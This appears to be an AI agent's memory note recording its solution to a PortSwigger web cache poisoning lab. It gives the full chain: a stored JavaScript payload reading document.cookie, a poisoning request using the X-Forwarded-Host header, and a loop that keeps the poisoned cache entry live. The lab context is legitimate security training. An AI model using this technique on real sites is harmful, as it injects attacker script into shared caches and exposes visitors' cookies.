---
metadata:
  node_type: memory
name: "Lab Web Cache Poisoning Unkeyed Header"
description: "Lab web-cache-poisoning-with-an-unkeyed-header solved: X-Forwarded-Host reflected into tracking.js src, payload stored at /resources/js/tracking.js on exploit server, home page cache poisoned and held across the victim window"
last_updated: 2026-10-10T16:10:25+08:00
created: 2026-10-10T16:10:25+08:00
---

## lab-web-cache-poisoning-with-an-unkeyed-header (arm A, solved)

Instance: https://0ad1000203e0b156807117a40005000a.web-security-academy.net (fresh, reused:false)
Exploit server: https://exploit-0acb009d0378b14d809a16d4017600fb.exploit-server.net
Jar: /tmp/cj1.json

### Ground truth
- Home page cache: X-Cache miss|hit, Cache-Control max-age=30; no query param needed, `/` is the poisoned key.
- Unkeyed input: X-Forwarded-Host is reflected verbatim into
  `<script type="text/javascript" src="//<host>/resources/js/tracking.js">`.
- Victim visits the home page on a cycle; the loaded script runs.

### Chain that worked
1. curl the lab page (pi transport to portswigger.net failed with "Unexpected EOF"; curl succeeded) -> widget-lab-id 145BAF066FE7FE27BB26A1A295E6A58D17AC101777181CC01014C893FDDA06C6.
2. range_launch launch-url <canonical path> --jar /tmp/cj1.json -> instance up (first attempt hit the same transport error, one retry sufficed).
3. Grab the exploit server from the instance home page: id='exploit-link' ... href='https://exploit-...exploit-server.net'.
4. Store the payload: POST exploit-server `/` with fields urlIsHttps=on, responseFile=/resources/js/tracking.js, responseHead=HTTP/1.1 200 OK\nContent-Type: application/javascript; charset=utf-8, responseBody=alert(document.cookie);, formAction=STORE.
   Stored path comes from responseFile, not from the requested URL - no need to visit the non-root path.
   Verify with GET /resources/js/tracking.js (200, alert(document.cookie);).
5. Poison: GET home `/` with X-Forwarded-Host: exploit-....exploit-server.net -> X-Cache: miss (this write populates `/`).
   Verify a plain GET without the header -> X-Cache: hit, body src points at the exploit server.
6. poison_loop <url> --header 'X-Forwarded-Host: exploit-...' --interval-secs 4 --count 12 -> keep the entry live across the 30s TTL for the victim's window.
7. banner_verdict -> solved:true, "Congratulations, you solved the lab!".

### Notes
- Re-sending the header while the entry is already poisoned draws a hit and does NOT un-poison it, so a sustain loop is safe.
- Transport flakiness: http_dump/http_session/range_launch intermittently die with "Network Error: Unexpected EOF" against portswigger.net; curl works. Retry, and prefer curl + grep for widget-lab-id when page_read keeps failing.
- rs pieces' transport worked for *.web-security-academy.net and *.exploit-server.net without issue this session.

